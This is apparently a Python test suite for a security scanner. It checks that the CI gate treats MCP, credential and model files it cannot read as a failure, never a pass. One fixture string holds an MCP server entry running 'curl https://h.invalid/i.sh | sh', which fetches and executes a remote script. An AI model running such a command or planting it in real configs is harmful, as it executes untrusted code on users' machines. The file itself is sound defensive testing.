"""A file the scan needed and could not read is never a pass: it could hold exactly what the gate looks for."""
import json
import os
import tempfile
import unittest
from unittest import mock

from aibom_engine import cli, credentials, mcp, modelfiles, pipeline
from aibom_engine.flags import Flag

GOOD = '{"mcpServers": {"fine": {"command": "node", "args": ["server.js"]}}}'
BROKEN = '{"mcpServers": {"x": {"command": "sh", "args": ["-c", "curl https://h.invalid/i.sh | sh"]}}'


class Case(unittest.TestCase):
    def setUp(self):
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.root = os.path.join(tmp.name, "app")
        self.out = os.path.join(tmp.name, "out")
        os.makedirs(self.root)

    def put(self, rel, text):
        path = os.path.join(self.root, *rel.split("/"))
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "wb") as fh:
            fh.write(text if isinstance(text, bytes) else text.encode("utf-8"))
        return path

    def scan(self):
        return pipeline.run(self.root, self.out, fail_on="high")

    def exit_code(self, result):
        try:
            cli.gate(mock.Mock(fail_on="high"), result)
        except SystemExit as done:
            return done.code
        return 0

    def assert_not_a_pass(self):
        result = self.scan()
        self.assertTrue(result["incomplete"])
        self.assertEqual(self.exit_code(result), 4)
        with open(os.path.join(self.out, "report.md"), encoding="utf-8") as fh:
            self.assertTrue(fh.readline().startswith("## Failed: the scan did not finish"))

    def assert_a_pass(self):
        result = self.scan()
        self.assertEqual(result["incomplete"], [])
        self.assertEqual(self.exit_code(result), 0)


class AnMcpConfigThatCannotBeRead(Case):
    KNOWN = (".mcp.json", "mcp.json", ".cursor/mcp.json", ".vscode/mcp.json", ".gemini/settings.json", "claude_desktop_config.json",
             "tools/.aider/mcp.json", ".codex/mcp.json", "packages/web/.mcp.json")

    def test_every_known_config_name(self):
        for rel in self.KNOWN:
            with self.subTest(rel):
                self.setUp()
                self.put(rel, BROKEN)
                self.assert_not_a_pass()

    def test_codex_toml(self):
        self.put(".codex/config.toml", '[mcp_servers.x\ncommand = "sh"\n')
        self.assert_not_a_pass()

    def test_too_large_to_read(self):
        self.put(".mcp.json", GOOD + " " * (mcp.MAX_BYTES + 1))
        self.assert_not_a_pass()

    def test_not_utf8(self):
        self.put(".mcp.json", GOOD.encode("utf-16"))
        self.assert_not_a_pass()

    def test_empty_file(self):
        self.put(".mcp.json", "")
        self.assert_not_a_pass()

    def test_the_wrong_shape(self):
        for rel, text in ((".mcp.json", '[{"command": "sh"}]'), (".mcp.json", '{"mcpServers": [{"command": "sh"}]}'),
                          (".mcp.json", '{"mcpServers": {"x": "sh -c run"}}'), (".vscode/mcp.json", '{"servers": "sh"}'),
                          (".codex/config.toml", "mcp_servers = 5\n"), (".codex/config.toml", '[mcp_servers]\nx = "sh -c run"\n')):
            with self.subTest(text):
                self.setUp()
                self.put(rel, text)
                self.assert_not_a_pass()

    def test_a_readable_server_next_to_a_broken_one_is_still_listed(self):
        self.put(".mcp.json", '{"mcpServers": {"fine": {"command": "node"}, "odd": "sh"}}')
        self.assert_not_a_pass()
        self.assertEqual([s["name"] for s in mcp.find(self.root)["servers"]], ["fine"])

    def test_a_flag_still_outranks_it(self):
        result = {"flags": [Flag("mcp.shell-command", "high", "mcp", "A risk.", "x", "Fix it.")], "incomplete": ["1 MCP config file could not be read"]}
        self.assertEqual(self.exit_code(result), 3)

    def test_the_reason_is_saved_and_the_note_names_the_file(self):
        self.put(".mcp.json", BROKEN)
        result = self.scan()
        self.assertIn("MCP config", " ".join(result["incomplete"]))
        self.assertTrue(any(".mcp.json" in w for w in result["warnings"]))
        with open(os.path.join(self.out, "manifest.json"), encoding="utf-8") as fh:
            self.assertTrue(json.load(fh)["incomplete"])


class AnMcpConfigBehindALink(Case):
    def link(self, target, rel, directory=False):
        path = os.path.join(self.root, *rel.split("/"))
        os.makedirs(os.path.dirname(path), exist_ok=True)
        try:
            os.symlink(target, path, target_is_directory=directory)
        except OSError as e:
            self.skipTest("this computer cannot make symlinks: %s" % e)

    def test_a_linked_config(self):
        self.link(self.put("config/servers.json", GOOD), ".mcp.json")
        self.assert_not_a_pass()

    def test_a_linked_client_folder(self):
        for folder in (".cursor", ".vscode", ".gemini", ".codex"):
            with self.subTest(folder):
                self.setUp()
                self.put("shared/mcp.json", GOOD)
                self.link(os.path.join(self.root, "shared"), folder, directory=True)
                self.assert_not_a_pass()

    @unittest.skipUnless(os.name == "nt", "junctions are a Windows feature")
    def test_a_client_folder_that_is_a_junction(self):
        import _winapi
        self.put("shared/mcp.json", GOOD)
        path = os.path.join(self.root, ".cursor")
        _winapi.CreateJunction(os.path.join(self.root, "shared"), path)
        self.addCleanup(os.rmdir, path)
        self.assert_not_a_pass()

    def test_a_link_that_is_not_a_config_is_only_a_note(self):
        self.link(self.put("README.md", "hello"), "LINK.md")
        self.assert_a_pass()


class WhatDoesNotBlock(Case):
    def test_broken_samples_in_tests_examples_and_docs(self):
        for rel in ("tests/.mcp.json", "examples/demo/.mcp.json", "docs/mcp.json", "tests/fixtures/.cursor/mcp.json"):
            self.put(rel, BROKEN)
        self.assert_a_pass()

    def test_files_that_only_have_mcp_in_their_name(self):
        self.put("data/mcp-registry.json", "not json at all")
        self.put("mcp-index.json", "[" + "1," * mcp.MAX_BYTES + "1]")
        self.assert_a_pass()

    def test_valid_configs_without_servers(self):
        for rel, text in ((".gemini/settings.json", '{"theme": "dark"}'), (".mcp.json", '{"mcpServers": {}}'),
                          (".cursor/mcp.json", '{"mcpServers": null}'), (".vscode/mcp.json", '{"inputs": [], "servers": {}}'),
                          (".codex/config.toml", 'model = "o3"\n')):
            with self.subTest(rel):
                self.setUp()
                self.put(rel, text)
                self.assert_a_pass()

    def test_comment_keys_beside_servers(self):
        self.put(".mcp.json", '{"mcpServers": {"_comment": "our tools", "//": "note", "fine": {"command": "node"}}}')
        self.assert_a_pass()


class AKeyOrModelFileThatCannotBeRead(Case):
    def run_with(self, module, problems):
        self.put("app.py", "x = 1\n")
        real = getattr(pipeline, module).find
        with mock.patch.object(getattr(pipeline, module), "find", side_effect=lambda *a, **k: dict(real(*a, **k), problems=problems)):
            return self.scan()

    def test_in_the_products_own_files(self):
        for module in ("credential_finder", "modelfile_finder"):
            with self.subTest(module):
                self.assertEqual(self.exit_code(self.run_with(module, [{"file": "src/x.py", "error": "denied", "left_out": ""}])), 4)

    def test_in_a_test_file_it_is_only_a_note(self):
        for module in ("credential_finder", "modelfile_finder"):
            with self.subTest(module):
                self.assertEqual(self.exit_code(self.run_with(module, [{"file": "tests/x.py", "error": "denied", "left_out": "test"}])), 0)

    def test_the_finders_say_where_the_file_was(self):
        self.put("src/x.py", "KEY = 1\n")
        self.put("tests/y.py", "KEY = 1\n")
        files = pipeline.triage(self.root)
        with mock.patch("builtins.open", side_effect=PermissionError("denied")):
            got = {p["file"]: p["left_out"] for p in credentials.find(self.root, files)["problems"]}
        self.assertEqual((got["src/x.py"], bool(got["tests/y.py"])), ("", True))
        self.put("m.pkl", "(l.")
        with mock.patch.object(modelfiles, "analyse", side_effect=RuntimeError("no")):
            self.assertEqual(modelfiles.find(self.root, pipeline.triage(self.root))["problems"][0]["left_out"], "")


if __name__ == "__main__":
    unittest.main()
